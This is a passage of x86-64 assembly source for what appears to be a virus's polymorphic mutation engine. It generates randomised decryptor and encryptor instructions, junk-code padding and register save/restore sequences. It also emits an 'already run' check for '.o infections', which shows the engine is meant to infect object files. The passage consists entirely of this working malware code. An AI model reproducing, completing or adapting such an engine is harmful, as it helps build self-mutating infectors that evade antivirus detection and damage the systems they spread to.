		js	.test	; rex reg?
		rol	eax,8
		test	dh,1	; word reg?
		jz	.test
		test	cl,0x20
		jnz	.test
		rol	eax,8	; byte reg
	.test:	test	al,bl
		multipop rax,rcx,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING +zf_if_CL_free
		ret

;-[CH_add_sub]----------------------------------------------------------------
; set CH to add/xor/or/sub
ADD_FUNCTION
CH_add_sub:	POLY_DEBUG_STRING +CH_add_sub
		BEGIN_EBLOCK_OPCODE
		push	rax
		mov	al,4
		INT3_CALL rand_al
		mov	ch,_ADD
		jz	.exit
		mov	ch,_OR
		dec	eax
		jz	.exit
		mov	ch,_XOR
		dec	eax
		jz	.exit
		mov	ch,_SUB
	.exit:	pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -CH_add_sub
		ret

;-[CH_and_or]-----------------------------------------------------------------
; set CH to and/or
ADD_FUNCTION
CH_and_or:	POLY_DEBUG_STRING +CH_and_or
		BEGIN_EBLOCK_OPCODE
		mov	ch,_AND
		INT3_CALL rand_prob
		js	.exit
		mov	ch,_OR
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -CH_and_or
		ret

;-[load_reg_reg]--------------------------------------------------------------
; mov r1,r2
; dl = r1, dh = r2 size, cl = r2
ADD_FUNCTION
load_reg_reg:	POLY_DEBUG_STRING +load_reg_reg
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx
		test	dh,8
		setnz	al
		add	al,2
		INT3_CALL rand_al
		jnz	.zero_add
		POLY_DEBUG_STRING *mov_rr
		mov	ch,_MOV_rm	; mov r,r
		INT3_CALL emit_op_rr_nc
		jmp	.exit
	.zero_add:
		dec	eax
		jnz	.push_pop
		POLY_DEBUG_STRING *zero_add
		; r1 = 0, r1 += r2 (add/sub/or/xor)
		xor	rbx,rbx
		INT3_CALL load_reg
		INT3_CALL junk3
		INT3_CALL CH_add_sub
		INT3_CALL emit_op_rr_nc
		cmp	ch,_SUB
		jne	.exit
		mov	ch,_NEG
		INT3_CALL junk3
		INT3_CALL emit_op_F6
		jmp	.exit
	.push_pop:
		POLY_DEBUG_STRING *push_pop
		push	rdx
		INT3_CALL swap_DX_CL
		xor	ch,ch
		INT3_CALL emit_op_50
		pop	rdx
		mov	ch,8
		INT3_CALL emit_op_50
	.exit:	INT3_CALL junk3
		multipop rax,rcx,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_reg_reg
		ret

;-[load_reg]------------------------------------------------------------------
; load register with value.
; rbx = decryptor value, rbp = encryptor value
; dl = reg number, dh = reg size + 0x80 if r8..r15
; CF set if to generate load in encryptor (r13) too.
ADD_FUNCTION
load_reg_nc:	db	0xA8	; do not load reg in encryptor
load_reg_cf:	stc		; do load reg in encryptor (rbp)

load_reg:	POLY_DEBUG_STRING +load_reg
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx,rbp,rsi
		jnc	.no_r13
		; emit load in encryptor
		xchg	rdi,r13
		push	rbx
		push	rbp
		pop	rbx
		INT3_CALL emit_op_B0
		pop	rbx
		xchg	rdi,r13
.no_r13:	; emit load in decryptor
		INT3_CALL sign_RBX_on_DH
		test	rbx,rbx		; reg is zero?
		jnz	.not_zero
		INT3_CALL .zero_reg
		jmp	.exit
	.not_zero:
		xor	rbp,rbp		; count of possible routines
		test	dh,8
		jz	.no64		; 64 bit case
		movsx	rsi,ebx		; zero + add, push imm/pop r64 ?
		cmp	rsi,rbx
		jne	.try_64_32
		lea	rax,[.push_pop64]
		push	rax
		inc	ebp
		add	rax,(.zero_add - .push_pop64)
		push	rax
		inc	ebp
	.try_64_32:
		mov	esi,ebx
		cmp	rsi,rbx		; use 32-bit reg instead?
		jne	.do_mov
		lea	rax,[.mov32]
		push	rax
		inc	ebp
		jmp	.do_mov
	.no64:	cmp	dh,2
		jne	.no_hl
		cmp	dl,3
		ja	.no_hl
		lea	rax,[.mov_l_h]
		push	rax
		inc	ebp
	.no_hl:	lea	rax,[.zero_add]
		push	rax
		inc	ebp
	.do_mov:lea	rax,[.mov]
		push	rax
		inc	ebp
	.choose:POLY_DEBUG_STRING *choose
		push	rbp
		pop	rax
		INT3_CALL rand
		mov	rax,[rsp+(rax*8)]
		shl	ebp,3
		add	rsp,rbp
		call	rax
	.exit:	multipop rax,rbx,rcx,rdx,rbp,rsi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -load_reg
		ret

.mov32:		POLY_DEBUG_STRING *mov32
		xor	dh,8^4

.mov:		POLY_DEBUG_STRING *mov
		call	emit_op_B0
		INT3_CALL junk3
		ret

.zero_add:	POLY_DEBUG_STRING *zero_add
		BEGIN_EBLOCK_OPCODE
		push	rbx
		INT3_CALL .zero_reg
		pop	rbx
		INT3_CALL CH_add_sub
		cmp	ch,_SUB
		jne	.do_zero_add
		neg	rbx
	.do_zero_add:
		INT3_CALL emit_op_80
		INT3_CALL junk3
		END_EBLOCK_OPCODE
		ret

.zero_reg:	POLY_DEBUG_STRING *zero_reg
		BEGIN_EBLOCK_OPCODE
	.zr:	xor	rbx,rbx
		mov	al,4
		INT3_CALL rand_al
		jnz	.zero_and
		mov	ch,_SUB		; SUB/XOR r,r
		INT3_CALL rand_prob
		js	.zero_sub
		mov	ch,_XOR
	.zero_sub:
		mov	cl,0x80
		and	cl,dh
		or	cl,dl
		INT3_CALL emit_op_rr_nc
		jmp	.zero_reg_exit
	.zero_and:			; AND r,0
		dec	eax
		jnz	.zero_push
		mov	ch,_AND
		INT3_CALL emit_op_80
		jmp	.zero_reg_exit
	.zero_push:			; PUSH 0, POP r
		dec	eax
		jnz	.zero_shift
		test	dh,8
		jz	.zr
		INT3_CALL .push_pop64
		INT3_CALL junk3
		jmp	.zero_reg_exit
	.zero_shift:
		test	dh,8
		jnz	.zr
		push	rdx 	; SHR/SHL r,max bits
		INT3_CALL get_BH_BL_shift_mask
		inc	bh
		mov	bl,31
		test	dh,4
		pushf
		jz	.zero_shift_l
		mov	bl,63
	.zero_shift_l:	INT3_CALL rand_any
			and	al,bl
			cmp	al,bh
			jb	.zero_shift_l
		mov	ch,_SHL
		;test	dh,4
		popf
		jz	.zero_shift_try_shr
		xor	dh,8^4
		jmp	.zero_shift_emit
	.zero_shift_try_shr:
		INT3_CALL rand_prob
		js	.zero_shift_emit
		mov	ch,_SHR
	.zero_shift_emit:
		xchg	eax,ebx
		stc	; no mask lower bits
		INT3_CALL emit_op_C0
		pop	rdx
.zero_reg_exit:	INT3_CALL junk3
		END_EBLOCK_OPCODE
		ret

.push_pop64:	POLY_DEBUG_STRING *push_pop64
		BEGIN_EBLOCK_OPCODE
		INT3_CALL emit_op_68
		mov	ch,8
		INT3_CALL emit_op_50
		INT3_CALL junk3
		END_EBLOCK_OPCODE
		ret

.mov_l_h:	POLY_DEBUG_STRING *mov_l_h
		BEGIN_EBLOCK_OPCODE
		mov	al,dl
		or	al,0xB0
		mov	ah,4
		xor	ah,al
		INT3_CALL rand_prob
		jpo	.l_h_s
		xchg	ah,al
		xchg	bl,bh
	.l_h_s:	stosb
		mov	al,bl
		stosb
		INT3_CALL junk3
		mov	al,ah
		stosb
		mov	al,bh
		stosb
		INT3_CALL junk3
		END_EBLOCK_OPCODE
		ret

;-[load_reg_mem]--------------------------------------------------------------
; load memory into register
; dh/dl = reg, cl = ptr reg
; CF if xchg can be used
ADD_FUNCTION
load_reg_mem:	BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		setc	al
		add	al,4
		INT3_CALL rand_al
		jnz	.zero_add
		mov	ch,_MOV_rm
		jmp	.op_rr
	.zero_add:
		dec	eax
		jnz	.and
		xor	rbx,rbx
		INT3_CALL load_reg
		INT3_CALL junk3
		INT3_CALL CH_add_sub
		jmp	.op_rr
	.and:	dec	eax
		jnz	.and_or
		push	-1
		pop	rbx
		INT3_CALL load_reg
		INT3_CALL junk3
		mov	ch,_AND
		jmp	.op_rr
	.and_or:dec	eax
		jnz	.xchg
		INT3_CALL CH_and_or
		INT3_CALL emit_op_rr_nc
		INT3_CALL junk3
		xor	ch,_OR^_AND
		jmp	.op_rr
	.xchg	mov	ch,_XCHG_rm
	.op_rr:	INT3_CALL emit_op_rr_nc
		cmp	ch,_SUB
		jne	.exit
		INT3_CALL junk3
		mov	ch,_NEG
		INT3_CALL emit_op_F6
	.exit:	INT3_CALL junk3
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		ret

;-[load_mem_reg]--------------------------------------------------------------
; load register into memory
; dh/dl = reg, cl = ptr reg
; CF if xchg can be used
ADD_FUNCTION
load_mem_reg:	BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		setc	al
		add	al,4
		INT3_CALL rand_al
		xchg	esi,eax
		mov	al,cl
		and	al,7
		mov	ah,0x80
		and	ah,cl
		mov	bl,dh
		and	bl,0xF
		or	ah,bl
		or	ah,0x40
		test	esi,esi
		jnz	.zero_add
		mov	ch,_MOV_rm|op_mr
		jmp	.op_rr
	.zero_add:
		dec	esi
		jnz	.and
		xchg	edx,eax
		xor	rbx,rbx
		INT3_CALL load_mem_imm
		xchg	edx,eax
		INT3_CALL CH_add_sub
		or	ch,op_mr
		jmp	.op_rr
	.and:	dec	esi
		jnz	.and_or
		xchg	edx,eax
		push	-1
		pop	rbx
		INT3_CALL load_mem_imm
		INT3_CALL junk3
		xchg	edx,eax
		mov	ch,_AND|op_mr
		jmp	.op_rr
	.and_or:dec	esi
		jnz	.xchg
		INT3_CALL CH_and_or
		or	ch,op_mr
		INT3_CALL emit_op_rr_nc
		INT3_CALL junk3
		xor	ch,_OR^_AND
		jmp	.op_rr
	.xchg:	mov	ch,_XCHG_rm
	.op_rr:	INT3_CALL emit_op_rr_nc
		cmp	ch,_SUB|op_mr
		jne	.exit
		INT3_CALL junk3
		xchg	edx,eax
		mov	ch,_NEG
		INT3_CALL emit_op_F6
	.exit:	INT3_CALL junk3
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		ret

;-[load_mem_imm]--------------------------------------------------------------
; load immediate value into memory
; dh/dl = reg (ptr), rbx = imm
ADD_FUNCTION
load_mem_imm:	BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		INT3_CALL sign_RBX_on_DH
		test	rbx,rbx
		jz	.const
		cmp	rbx,01
		je	.const
		mov	al,4
		INT3_CALL rand_al
		jnz	.zero_add
	.const:	INT3_CALL .do_const
		jmp	.exit
	.zero_add:
		dec	eax
		jnz	.and
		push	rbx
		xor	rbx,rbx
		INT3_CALL .do_const
		pop	rbx
		INT3_CALL CH_add_sub
		cmp	ch,_SUB
		jne	.nosub
		neg	rbx
	.nosub:	jmp	.op80
	.and:	dec	eax
		jnz	.and_or
		push	rbx
		push	-1
		pop	rbx
		INT3_CALL .do_const
		pop	rbx
		mov	ch,_AND
		jmp	.op80
	.and_or:INT3_CALL CH_and_or
	.no_or:	INT3_CALL emit_op_80
		INT3_CALL junk3
		xor	ch,_OR^_AND
	.op80:	INT3_CALL emit_op_80
	.exit:	INT3_CALL junk3
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		ret

	.do_const:
		BEGIN_EBLOCK_OPCODE
		test	rbx,rbx
		jnz	.const_try1
		mov	ch,_AND
		jmp	.emit_const
	.const_try1:
		cmp	rbx,-1
		jne	.c6
		mov	ch,_OR
	.emit_const:
		INT3_CALL rand_prob
		js	.c6
		INT3_CALL emit_op_80
		jmp	.const_exit
	.c6:	INT3_CALL emit_op_C6
	.const_exit:
		INT3_CALL junk3
		END_EBLOCK_OPCODE
		ret

;-[gen_test_reg]--------------------------------------------------------------
; generate test reg(DX) for ZF/SF
ADD_FUNCTION
gen_test_reg:	POLY_DEBUG_STRING +gen_test_reg
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rdx,rbx
		mov	cl,0x80
		and	cl,dh
		or	cl,dl
		xor	rbx,rbx
		mov	al,3
		INT3_CALL rand_al
		jnz	.and_imm
		INT3_CALL CH_add_sub	; add/or/xor/sub reg,0
		mov	al,3
		INT3_CALL rand_al
		jnz	.do80
		mov	ch,_CMP		; cmp reg,0
		jmp	.do80
	.and_imm:
		dec	eax
		jnz	.reg_reg
		dec	rbx		; and/test reg,-1
		mov	ch,_AND
		INT3_CALL rand_prob
		js	.do80
		mov	ch,_TEST
		INT3_CALL emit_op_F6
		jmp	.exit
	.do80	INT3_CALL emit_op_80
		jmp	.exit
	.reg_reg:			; and/or/test reg,reg
		INT3_CALL CH_and_or
		INT3_CALL rand_prob
		js	.rr
		mov	ch,_TEST_rm
	.rr:	INT3_CALL emit_op_rr_nc
	.exit:	multipop rax,rcx,rdx,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -gen_test_reg
		ret

;-[sign_RBX_on_DH]------------------------------------------------------------
; sign extend RBX from BL/BX/EBX depending on size in DH
ADD_FUNCTION
sign_RBX_on_DH:	POLY_DEBUG_STRING +sign_RBX_on_DH
		BEGIN_EBLOCK_OPCODE
		test	dh,8
		jnz	.exit
		test	dh,1
		jz	.try2
		movsx	rbx,bl
	.try2:	test	dh,2
		jz	.try4
		movsx	rbx,bx
	.try4:	test	dh,4
		jz	.exit
		movsx	rbx,ebx
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -sign_RBX_on_DH
		ret

;-[swap_DX_CL]-----------------------------------------------------------------
; swap dx cl regs
ADD_FUNCTION
swap_DX_CL:	POLY_DEBUG_STRING +swap_dx_CL
		BEGIN_EBLOCK
		push	rax
		mov	ch,dh
		push	rcx
		mov	cl,0x80 + 0x40 + 0x20
		and	cl,dh
		or	cl,dl
		pop	rax
		mov	dh,0x80 + 0x40 + 0x20
		and	dh,al
		and	ah,0xF
		or	dh,ah
		mov	dl,0x7
		and	dl,al
		pop	rax
		END_EBLOCK
		POLY_DEBUG_STRING -swap_dx_CL
		ret

;-[set_AH_modrm]--------------------------------------------------------------
; set AH to modrm byte, DH = reg size/type + 0x40 if memory, ch = op, dl = reg num
; inc al if size not 1
ADD_FUNCTION
set_AH_modrm:	POLY_DEBUG_STRING +set_AH_modrm
		BEGIN_EBLOCK
		push	rdx
		test	dh,1
		jnz	.no_inc
		inc	eax
	.no_inc:cmp	dl,0xFE
		jae	.mem
		mov	ah,dl
		add	ah,ch
		test	dh,0x40
		jnz	.emit
		add	ah,0xC0
	.emit:	stosw
		INT3_CALL emit_dx_trail_byte
		jmp	.ret
	.mem:	stosb
		mov	al,ch
		INT3_CALL emit_mem_address
	.ret:	pop	rdx
		END_EBLOCK
		POLY_DEBUG_STRING -set_AH_modrm
		ret

;-[emit_66_on_DH]-------------------------------------------------------------
; emit 0x66 prefix if size of reg is DH is 2 (word)
ADD_FUNCTION
emit_66_on_DH:	POLY_DEBUG_STRING +emit_66_on_DH
		BEGIN_EBLOCK
		test	dh,2
		jz	.ret
		mov	al,0x66
		stosb
	.ret:	END_EBLOCK
		POLY_DEBUG_STRING -emit_66_on_DH
		ret

;-[emit_RAX_DH]---------------------------------------------------------------
; emit DH bytes from RBX
ADD_FUNCTION
emit_RBX_DH:	POLY_DEBUG_STRING +emit_RBX_DH
		BEGIN_EBLOCK
		multipush rax,rcx
		push	rbx
		pop	rax
		push	0xF
		pop	rcx
		and	cl,dh
	.l:	stosb
		shr	rax,8
		loop	.l
		multipop rax,rcx
		END_EBLOCK
		POLY_DEBUG_STRING -emit_RBX_DH
		ret

;-[emit_DH_prefix]------------------------------------------------------------
; emit 40/41/48/49 prefix based on DH
ADD_FUNCTION
emit_DH_prefix:	POLY_DEBUG_STRING +emit_DH_prefix
		BEGIN_EBLOCK
		push	rax
		INT3_CALL emit_66_on_DH
		mov	al,8
		and	al,dh	; 0x48 if 64-bit
		cmp	dh,0x21
		je	.do40
		test	dh,dh
		jns	.no_r1
		cmp	dl,0xFE
		jae	.no_r1
		inc	eax
	.no_r1:	test	al,al
		jz	.exit
	.do40:	or	al,0x40
		stosb
	.exit:	pop	rax
		END_EBLOCK
		POLY_DEBUG_STRING -emit_DH_prefix
		ret

;-[emit_DH_CL_prefix_rr]------------------------------------------------------
; emit prefix for op r1,r2.
; dh = r1 size, cl = r2 0/0x40 if mem/0x80 if r8+
ADD_FUNCTION
emit_DH_CL_prefix_rr:
		POLY_DEBUG_STRING +emit_DH_CL_prefix_rr
		BEGIN_EBLOCK
		multipush rax,rcx,rdx
		INT3_CALL emit_66_on_DH
		xor	al,al
		cmp	dh,0x21
		je	.do40
		cmp	cl,0x7E
		jae	.no_cl20
		test	cl,0x20
		jz	.no_cl20
	.do40:	mov	al,0x40	; 0x40 for spl/sil/bpl/dil
	.no_cl20:
	.not_write:
		test	dh,8	; 0x48 if 64-bit
		jz	.no8
		or	al,8
	.no8:	test	cl,0x40
		jz	.no_swap
		xchg	cl,dh	; swap r,r/m if mem
	.no_swap:
		test	dh,dh
		jns	.no_r1
		cmp	dl,0xFE
		jae	.no_r1
		inc	eax	; 0x41 if reg1 extended
	.no_r1:	test	cl,cl
		jns	.no_r2
		or	al,4	; 0x44 if reg2 extended
	.no_r2:	test	al,al
		jz	.exit
		or	al,0x40
		stosb
	.exit:	multipop rax,rcx,rdx
		END_EBLOCK
		POLY_DEBUG_STRING -emit_DH_CL_prefix_rr
		ret

;-[emit_DX_trail_byte]--------------------------------------------------------
; emit imm0/sib if needed for mem dx
ADD_FUNCTION
emit_dx_trail_byte:
		multipush rax,rdx
		test	dh,0x40
		jz	.exit
		cmp	dl,4	; rsp/r12 do SIB
		jne	.try_r13
		mov	al,0x24
		jmp	.exit_stosb
	.try_r13:
		cmp	dl,5	; rbp/r13 disp8+0
		jne	.exit
		add	byte [rdi-1],0x40
		xor	al,al
	.exit_stosb:
		stosb
	.exit:	multipop rax,rdx
		ret

;-[emit_op_80]----------------------------------------------------------------
; emit 80/81/83 op
; CH = op, DL = reg, DH = size + 0x80 if r0+ 0x40 if mem, RBX = immediate
ADD_FUNCTION
emit_op_80:	POLY_DEBUG_STRING +emit_op_80
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx,rbp
		INT3_CALL sign_RBX_on_DH
		INT3_CALL emit_DH_prefix
		cmp	dx,0x100
		je	.do_ax
		movsx	rax,bl		; try /5 for ax/al
		cmp	rax,rbx
		je	.do80
		test	dx,0xC007
		jnz	.do80
	.do_ax: test	dh,1
		setz	al
		add	al,0x04
		or	al,ch
		stosb
		jmp	.imm
	.do80:	mov	al,0x80
		test	dh,1
		jnz	.mod
		movsx	rbp,bl
		cmp	rbp,rbx
		jne	.mod
		mov	al,0x83
		and	dh,0x40+0x80
		inc	dh
	.mod:	mov	cl,0xf
		and	cl,dh
		INT3_CALL set_AH_modrm
	.imm:	test	dh,8
		jz	.no64
		xor	dh,4^8
	.no64:	INT3_CALL emit_RBX_DH
		multipop rax,rbx,rcx,rdx,rbp
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_80
		ret

;-[emit_op_C6]----------------------------------------------------------------
; emit C6/C7 op (mov r/m,imm)
; dl/dh = reg, rbx = imm
ADD_FUNCTION
emit_op_C6:	POLY_DEBUG_STRING +emit_op_C6
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		INT3_CALL sign_RBX_on_DH
		INT3_CALL emit_DH_prefix
		mov	al,0xC6
		xor	ch,ch
		test	dh,8
		jz	.no64
		mov	dh,4
	.no64:	mov	cl,0xF
		and	cl,dh
		INT3_CALL set_AH_modrm
		INT3_CALL emit_RBX_DH
		multipop rax,rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_C6
		ret
;-[emit_op_C0]----------------------------------------------------------------
; emit 0xC0 (or 0xD0) op - shift/rotate r,imm8/1/8
; ch = op, dl = reg, dh = reg size, type + 40 if mem, bl = immediate
; CF to skip masking significant bits.
; ch+=sh_cl for CL, nothing emitted on 0 shift.
ADD_FUNCTION
emit_op_C0:	POLY_DEBUG_STRING +emit_op_C0
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx
		jc	.no_mask
		INT3_CALL get_BH_BL_shift_mask
		and	bl,bh
		jz	.exit
	.no_mask:
		INT3_CALL emit_DH_prefix
		mov	al,0xC0
		test	ch,sh_cl
		jnz	.doD0
		cmp	bl,1
		jne	.doC0
	.doD0:	mov	al,sh_cl
		and	al,ch
		add	al,0XD0
	.doC0:	and	ch,~sh_cl
		xor	cl,cl
		cmp	al,0xC2
		pushf
		adc	cl,cl
		INT3_CALL set_AH_modrm
		popf
		ja	.exit
		mov	al,bl
		stosb
	.exit:	multipop rax,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_C0
		ret

;-[emit_op_F6]----------------------------------------------------------------
; emit 0xF6 op - test,not,neg,mul,imul,div,idiv
; ch = op, dl = reg, dh = reg size, rbx = immediate if test
ADD_FUNCTION
emit_op_F6:	POLY_DEBUG_STRING +emit_op_F6
		BEGIN_EBLOCK_OPCODE
		push	rdx
		push	rax
		INT3_CALL emit_DH_prefix
		mov	al,0xF6
		xor	cl,cl
		cmp	ch,_TEST
		jne	.c0
		mov	cl,0xF
		and	cl,dh
		test	cl,8
		jz	.c0
		xor	cl,8^4
	.c0:	INT3_CALL set_AH_modrm
		mov	dh,cl
		test	dh,dh
		jz	.exit
	.rbx:	INT3_CALL emit_RBX_DH
	.exit:	pop	rax
		pop	rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_F6
		ret

;-[emit_op_B0]----------------------------------------------------------------
; emit Bx - mov reg,imm - dl = reg, dh = type/size, rbx = imm
ADD_FUNCTION
emit_op_B0:	POLY_DEBUG_STRING +emit_op_B0
		BEGIN_EBLOCK_OPCODE
		INT3_CALL emit_DH_prefix
		mov	al,7
		and	al,dl
		or	al,0xB0
		test	dh,1
		jnz	.no_mov_8
		add	al,8
	.no_mov_8:
		stosb
		INT3_CALL emit_RBX_DH
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING +emit_op_B0
		ret

;-[emit_op_rr]----------------------------------------------------------------
; emit add..cmp,mov,test,xchg r1,r2
; ch = op, dl = r1 ,dh = r1 size, cl = r2 +0x80 if rex	 + 0x40 if mem
ADD_FUNCTION
emit_op_rr_nc:	db 0xA8		; no 0x0F
emit_op_rr_cf:	stc		; add 0x0F
emit_op_rr:	POLY_DEBUG_STRING +emit_op_rr
		BEGIN_EBLOCK
		multipush rax,rcx,rdx
		pushf
		call emit_DH_CL_prefix_rr
		popf
		jnc	.no_f
		mov	al,0x0F
		stosb
	.no_f:	xor	al,al
		mov	ah,0xF0
		and	ah,ch
		cmp	ah,0x40
		je	.no_mr		; cmov
		cmp	ch,0xBC		; bsr/bsf
		je	.no_mr
		mov	ah,~(1 + 0x8)
		and	ah,ch
		cmp	ah,0xA4		; shld/shrd
		je	.no_mr ;.no_byte_inc
		cmp	ah,0xB6		; movzx/movsx
		je	.no_byte_inc
		test	dh,1
		setz	al
	.no_byte_inc:
		cmp	dl,0xFE
		jae	.no_mr
		test	dh,0x40
		jnz	.no_mr
		test	cl,0x40
		jz	.no_mr
		cmp	ch,_XCHG_rm	; swap r,r/m if needed
		je	.no_mr
		cmp	ch,_TEST_rm
		je	.no_mr
		cmp	ch,_LEA_rm
		je	.no_mr
		xor	ch,op_mr
	.no_mr:	or	al,ch
		stosb
		cmp	dl,0xFE
		jae	.mem_dx
		cmp	cl,0x7F
		je	.mem_cl
		cmp	cl,0x7E
		je	.mem_cl
		test	cl,0x40
		jz	.dx
		mov	al,0x7		; do reg,mem
		and	al,cl
		shl	dl,3
		jmp	.emit
	.dx:	test	dh,0x40
		jz	.no_dx
		mov	al,cl
		shl	al,3
		mov	cl,0x80 + 0x40 + 0x20
		and	cl,dh
		or	cl,dl
		jmp	.emit
	.no_dx:	mov	al,cl
		shl	al,3
		add	al,0xC0
	.emit:	add	al,dl
		stosb
		and	cl,~(0x80 + 0x20)
		cmp	cl,0x40 + 4	; rsp/r12 do SIB
		jne	.try_r13
		mov	al,0x24
		jmp	.exit_stosb
	.try_r13:
		cmp	cl,0x40 + 5	; rbp/r13 disp8+0
		jne	.exit
		add	byte [rdi-1],0x40
		xor	al,al
	.exit_stosb:
		stosb
		jmp	.exit
	.mem_cl:mov	al,dl
		jmp	.shl
	.mem_dx:mov	al,cl
	.shl:	shl	al,3
		xchg	cl,sil
		call emit_mem_address
	.exit:	multipop rax,rcx,rdx
		END_EBLOCK
		POLY_DEBUG_STRING -emit_op_rr
		ret

;-[emit_op_FE]----------------------------------------------------------------
; emit 0xFE op - inc/dec/call reg etc
; ch = op, dl = reg, dh = opsize
ADD_FUNCTION
emit_op_FE:	POLY_DEBUG_STRING +emit_op_FE
		BEGIN_EBLOCK_OPCODE
		push	rax
		INT3_CALL emit_DH_prefix
		mov	al,0xFE
		xor	cl,cl
		INT3_CALL set_AH_modrm
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_FE
		ret

;-[emit_op_68]----------------------------------------------------------------
; emit push imm32
; ebx = imm
ADD_FUNCTION
emit_op_68:	POLY_DEBUG_STRING +emit_op_68
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rdx
		mov	dh,4
		mov	al,0x68
		movsx	ecx,bl
		cmp	ecx,ebx
		jne	.emit
		mov	dh,1
		mov	al,0x6A
	.emit:	stosb
		INT3_CALL emit_RBX_DH
		multipop rax,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_68
		ret

;-[emit_op_50]----------------------------------------------------------------
; emit PUSH/POP r64
; dx = reg, ch 0/8 push/pop
ADD_FUNCTION
emit_op_50:	POLY_DEBUG_STRING +emit_op_50
		BEGIN_EBLOCK_OPCODE
		push	rax
		test	dh,dh
		jns	.ns
		mov	al,0x41
		stosb
	.ns:	mov	al,ch
		or	al,dl
		or	al,0x50
		stosb
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_50
		ret

;-[emit_op_0FBA]--------------------------------------------------------------
; emit op 0x0F 0xBA - bt/bts/btr/btc imm8
; ch = op, bl = imm
ADD_FUNCTION
emit_op_0FBA:	POLY_DEBUG_STRING +emit_op_0FBA
		BEGIN_EBLOCK_OPCODE
		test	dh,1
		jnz	.exit
		cmp	ch,_BT
		jb	.exit
		INT3_CALL get_BH_BL_shift_mask
		and	bl,bh
		INT3_CALL emit_DH_prefix
		mov	al,0xF
		stosb
		mov	al,0xBA - 1
		mov	cl,1
		INT3_CALL set_AH_modrm
		mov	al,bl
		stosb
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -emit_op_0FBA
		ret

;-[emit_push_sequence]--------------------------------------------------------
; emit PUSH prolog to save registers
ADD_FUNCTION
emit_push_sequence:
		POLY_DEBUG_STRING +emit_push_sequence
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx
		INT3_CALL alloc_all_regs
		bt	dword [g_poly_flags],RETAL_POLY_NO_PUSHF
		jc	.nf
		mov	al,0x9C		; PUSHF
		stosb
	.nf:	push	15
		pop	rcx
		lea	rsi,[g_poly_push_pop_seq]
	.push_loop:	lodsw
			xchg	edx,eax
			mov	bx,[g_poly_mem_reg_dx]
			cmp	bx,dx
			je	.no_free
			INT3_CALL free_word_reg_DX
		.no_free:
			INT3_CALL emit_op_50
			INT3_CALL small_junk
			loop	.push_loop
		multipop rax,rcx,rbx
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -emit_push_sequence
		ret

;-[emit_pop_sequence]---------------------------------------------------------
; emit POP epilogue to restore registers
ADD_FUNCTION
emit_pop_sequence:
		POLY_DEBUG_STRING +emit_pop_sequence
		POLY_DEBUG_RDI_R13
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	15
		pop	rcx
		lea	rsi,[g_poly_push_pop_seq+30-2]
	.pop_loop:	INT3_CALL small_junk
			mov	dx,[rsi]
			sub	rsi,2
			mov	al,dl
			test	dh,dh
			jns	.nos
			INT3_CALL alloc_regr
			jmp	.done_free
		.nos:	INT3_CALL alloc_regw
		.done_free:
			mov	ch,8
			INT3_CALL emit_op_50
			xor	ch,ch
			loop	.pop_loop
		bt	dword [g_poly_flags],RETAL_POLY_NO_PUSHF
		jc	.nf
		mov	al,0x9D		; POPF
		stosb
	.nf:	multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_RDI_R13
		POLY_DEBUG_STRING -emit_pop_sequence
		ret

;-[gen_o_check]---------------------------------------------------------------
; gen 'already run' check in .o infections
ADD_FUNCTION
gen_o_check:	POLY_DEBUG_STRING +gen_o_check
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx
		call	zf_if_ofile
		jnz	.exit2
		mov	dh,8
		INT3_CALL alloc_word_reg_DX	; get 64-bit ptr reg
		push	rdx

		mov	cl,0x80		; cl = ptr as 2nd arg
		and	cl,dh
		or	cl,0x40
		or	cl,dl

		xor	rbx,rbx
		call	emit_op_B0
		lea	rax,[rdi-8]
		; set .bss dword reloc to rax
		INT3_CALL rax_to_vaddr
		mov	[reloc_offset_check],rax
		INT3_CALL small_junk
		mov	al,3
		INT3_CALL rand_al
		mov	ch,_CMP
		jz	.do_test
		INT3_CALL CH_add_sub
		dec	eax
		jz	.do_test
		dec	ebx
		mov	ch,_AND
	.do_test: ; Compare with Zero
		bt	dword [g_poly_flags],RETAL_POLY_O_CHECK_REG
		jc	.check_reg
		; and/or/xor/add/sub/test [r],imm
		xor	dh,0x40^8
		xor	dh,[g_poly_o_check_size]
		cmp	ch,_AND
		jne	.test80
		INT3_CALL rand_prob
		jpe	.test80
		mov	ch,_TEST
